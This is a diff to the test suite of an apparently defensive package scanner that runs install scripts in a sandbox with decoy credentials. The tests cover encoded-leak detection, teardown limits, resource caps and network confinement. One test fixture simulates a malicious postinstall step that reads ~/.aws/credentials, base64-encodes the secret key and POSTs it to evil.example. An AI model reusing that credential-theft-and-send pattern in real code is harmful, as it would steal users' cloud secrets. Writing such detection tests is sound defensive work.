@@ -129,11 +129,15 @@ test("#6 a payload that CONNECTs to a known callback host is caught as behaviora
   fs.rmSync(pkgDir, { recursive: true, force: true });
 });
 
-test("#6 a benign payload with no egress yields a safe behavioral verdict", async () => {
+test("#6 a benign payload with no egress yields a 'not-observed' behavioral verdict (never 'safe')", async () => {
   const pkgDir = await stagedPackage();
   const runner = async () => ({ ran: [{ hook: "postinstall", simulated: true }] });
   const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
-  assert.equal(result.verdict, "safe");
+  // A clean behavioral run can never CLEAR a package — the verdict vocabulary
+  // reflects that: it is "not-observed", never "safe".
+  assert.equal(result.verdict, "not-observed");
+  assert.notEqual(result.verdict, "safe");
+  assert.equal(result.confirmsButCannotClear, true);
   assert.equal(result.egress.length, 0);
   assert.ok(!result.findings.some((f) => f.severity === "high"));
   fs.rmSync(pkgDir, { recursive: true, force: true });
@@ -220,6 +224,110 @@ test("#6 a post-settle delayed beacon is still captured during the egress grace 
     );
   }
   fs.rmSync(pkgDir, { recursive: true, force: true });
+});
+
+// --- hardening: encoded-exfil, bounded teardown, resource caps, net confinement ---
+
+const { tokenVariants, buildRlimitPrefix } = require("../src/sandbox");
+
+// A payload that base64-encodes the stolen token before POSTing would defeat a
+// plain substring match. matchTokens now also probes reversible encodings, so
+// the leak is still attributed to the exact decoy.
+test("#6 an encoded (base64) canary leak is still caught as behavioral-exfil", async () => {
+  const pkgDir = await stagedPackage();
+  const runner = async ({ home, proxyPort }) => {
+    const creds = await fsp.readFile(path.join(home, ".aws/credentials"), "utf8");
+    const token = creds.match(/aws_secret_access_key\s*=\s*(\S+)/)[1];
+    const encoded = Buffer.from(token, "utf8").toString("base64");
+    await proxiedHttpPost(proxyPort, "http://evil.example/collect", `blob=${encoded}`);
+    return { ran: [{ hook: "postinstall", simulated: true }] };
+  };
+  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
+  assert.equal(result.verdict, "block");
+  assert.ok(
+    result.findings.some((f) => f.category === "behavioral-exfil"),
+    `encoded leak not caught: ${JSON.stringify(result.findings)}`
+  );
+  fs.rmSync(pkgDir, { recursive: true, force: true });
+});
+
+test("#6 tokenVariants covers base64 / base64url / hex / url-encoding", () => {
+  const variants = tokenVariants("a/b+c=d e");
+  assert.ok(variants.includes("a/b+c=d e"), "keeps the verbatim token");
+  assert.ok(variants.includes(Buffer.from("a/b+c=d e").toString("base64")));
+  assert.ok(variants.includes(Buffer.from("a/b+c=d e").toString("hex")));
+  assert.ok(variants.includes(encodeURIComponent("a/b+c=d e")));
+});
+
+// A payload that opens a keep-alive connection to the capture proxy and never
+// closes it must NOT wedge teardown: server.close()'s callback only fires once
+// every socket ends, so the run bounds it by force-destroying lingering sockets.
+test("#6 a lingering keep-alive connection to the proxy does not hang teardown", { skip: process.platform === "win32" }, async () => {
+  const pkgDir = await stagedPackage();
+  let held;
+  const runner = ({ proxyPort }) =>
+    new Promise((resolve) => {
+      // Open a raw socket to the proxy and hold it open (never end it).
+      held = net.connect(proxyPort, "127.0.0.1", () => {
+        held.write("GET http://lingering.example/ HTTP/1.1\r\nHost: lingering.example\r\n\r\n");
+        // Return from the runner while the socket stays open.
+        setTimeout(() => resolve({ ran: [{ hook: "postinstall", simulated: true }] }), 50);
+      });
+      held.on("error", () => resolve({ ran: [] }));
+    });
+
+  // If teardown could hang this would never resolve; bound the whole run.
+  const result = await Promise.race([
+    runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 }),
+    new Promise((_, rej) => setTimeout(() => rej(new Error("teardown hung on a lingering connection")), 8000))
+  ]);
+  assert.ok(result.runId, "run completed despite a held-open proxy connection");
+  try { held.destroy(); } catch { /* noop */ }
+  fs.rmSync(pkgDir, { recursive: true, force: true });
+});
+
+// Resource caps are applied via `ulimit` in the spawned POSIX shell: assert the
+// child actually runs under the lowered process/file limits (proves the prefix
+// is in effect, not just present as a string).
+test("#6 ulimit resource caps are applied to the untrusted child", { skip: process.platform === "win32" }, async () => {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-ulimit-"));
+  const outcome = await execWithTimeout("ulimit -u; ulimit -c", {
+    cwd: dir,
+    env: process.env,
+    timeoutMs: 5000,
+    wrapper: null,
+    rlimits: { maxProcs: 321, coreDumps: 0 }
+  });
+  const lines = String(outcome.output || "").trim().split(/\s+/);
+  assert.ok(lines.includes("321"), `expected max-procs cap 321 in child ulimit output: ${outcome.output}`);
+  assert.ok(lines.includes("0"), `expected core-dump cap 0 in child ulimit output: ${outcome.output}`);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+test("#6 buildRlimitPrefix is a no-op when disabled and derives CPU cap from the timeout", () => {
+  assert.equal(buildRlimitPrefix(20000, false), "");
+  const prefix = buildRlimitPrefix(20000, undefined);
+  if (process.platform !== "win32") {
+    assert.match(prefix, /^ulimit /);
+    assert.match(prefix, /-t 30\b/); // ceil(20000/1000) + 10
+    assert.match(prefix, /-u \d+/);
+    assert.match(prefix, /2>\/dev\/null; $/);
+  } else {
+    assert.equal(prefix, "");
+  }
+});
+
+// On macOS the OS profile must deny non-loopback egress (so a raw-socket exfil
+// is blocked at the boundary, not merely unobserved) while keeping loopback
+// open for the capture proxy.
+test("#6 macOS sandbox-exec profile confines network to loopback", { skip: process.platform !== "darwin" }, () => {
+  const info = detectSandboxWrapper("/tmp/pkgxray-sbtest");
+  if (info.level !== "sandbox-exec") return; // sandbox-exec not present
+  assert.equal(info.netConfined, true);
+  const argv = info.wrap(["sh", "-c", "true"]);
+  const profile = argv[argv.indexOf("-p") + 1];
+  assert.match(profile, /\(deny network\*\)/);
+  assert.match(profile, /allow network-outbound \(remote ip "localhost:\*"\)/);
 });
 
 test("#6 --require-sandbox fails closed when no OS sandbox wrapper is available", async () => {
